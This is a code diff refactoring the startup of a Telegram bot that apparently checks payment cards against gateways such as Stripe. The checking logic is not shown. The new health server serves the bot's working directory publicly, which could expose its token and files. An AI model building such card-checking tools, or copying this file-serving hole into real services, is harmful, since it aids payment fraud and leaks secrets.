+    @bot.message_handler(func=lambda m: True)
+    def text(m): handler.handle_single(m, 'stripe') if '|' in m.text else bot.reply_to(m, "⚠️ أمر غير معروف")
     
-    # ==================== معالج الكول باك ====================
+    @bot.callback_query_handler(func=lambda c: True)
+    def cb(c): callback.handle(c)
     
-    @bot.callback_query_handler(func=lambda call: True)
-    def callback_query(call):
-        callback_handler.handle_callback(call)
-    
-    # ==================== معلومات البوت ====================
-    
-    bot_info = f"""
-╔══════════════════════════╗
-║     Obeida Online Bot    ║
-║    Multi Gateway Checker  ║
-╠══════════════════════════╣
-║ توكن: {BOT_TOKEN[:10]}...{BOT_TOKEN[-10:]}
-║ مشرفون: {len(ADMIN_IDS)}
-║ بوابات: {len(GATES)}
-║ قناة: {CHANNEL_USERNAME}
-║ مطور: {DEV_CONTACT}
-╚══════════════════════════╝
-    """
-    
-    print(Fore.CYAN + "="*50)
-    print(Fore.GREEN + bot_info)
-    print(Fore.CYAN + "="*50)
-    print(Fore.YELLOW + "🚀 البوت يعمل الآن...")
-    print(Fore.YELLOW + "📢 القناة: " + Fore.WHITE + CHANNEL_USERNAME)
-    print(Fore.YELLOW + "👤 المطور: " + Fore.WHITE + DEV_CONTACT)
-    print(Fore.YELLOW + "📊 نظام العرض المباشر: " + Fore.GREEN + "✅ مفعل")
-    print(Fore.CYAN + "="*50 + Style.RESET_ALL)
-    
-    # ========== تشغيل خادم Health Check ==========
-    def run_health_server():
+    # Health check server
+    def run_health():
         port = int(os.environ.get('PORT', 10000))
-        handler = http.server.SimpleHTTPRequestHandler
-        
-        class HealthCheckHandler(handler):
-            def do_GET(self):
-                if self.path == '/':
-                    self.send_response(200)
-                    self.send_header('Content-type', 'text/html')
-                    self.end_headers()
-                    self.wfile.write(b'<h1>Obeida Online Bot is Running!</h1>')
-                elif self.path == '/health':
-                    self.send_response(200)
-                    self.send_header('Content-type', 'application/json')
-                    self.end_headers()
-                    self.wfile.write(b'{"status": "healthy", "uptime": "active"}')
-                else:
-                    self.send_response(404)
-                    self.end_headers()
-        
-        with socketserver.TCPServer(("0.0.0.0", port), HealthCheckHandler) as httpd:
-            print(f"🌐 Health check server running on port {port}")
+        with socketserver.TCPServer(("0.0.0.0", port), http.server.SimpleHTTPRequestHandler) as httpd:
+            print(f"🌐 Health check on {port}")
             httpd.serve_forever()
     
-    # تشغيل خادم health check في خيط منفصل
-    health_thread = threading.Thread(target=run_health_server, daemon=True)
-    health_thread.start()
-    # ========== نهاية كود Health Check ==========
+    threading.Thread(target=run_health, daemon=True).start()
     
-    # تشغيل البوت
-    try:
-        bot.infinity_polling(timeout=60, long_polling_timeout=60)
-    except Exception as e:
-        print(Fore.RED + f"❌ خطأ في تشغيل البوت: {e}" + Style.RESET_ALL)
-        time.sleep(5)
-        # إعادة التشغيل التلقائي
-        setup_bot()
+    print(Fore.GREEN + "🚀 البوت يعمل..." + Style.RESET_ALL)
+    bot.infinity_polling()
 
-# ==================== نقطة البداية ====================
+# ==================== التشغيل ====================
 if __name__ == "__main__":
     try:
-        setup_bot()
+        setup()
     except KeyboardInterrupt:
-        print(Fore.RED + "\n\n⚠️ تم إيقاف البوت بواسطة المستخدم" + Style.RESET_ALL)
+        print("\n⚠️ تم الإيقاف")
         sys.exit(0)
-    except Exception as e:
-        print(Fore.RED + f"\n❌ خطأ غير متوقع: {e}" + Style.RESET_ALL)
-        sys.exit(1)
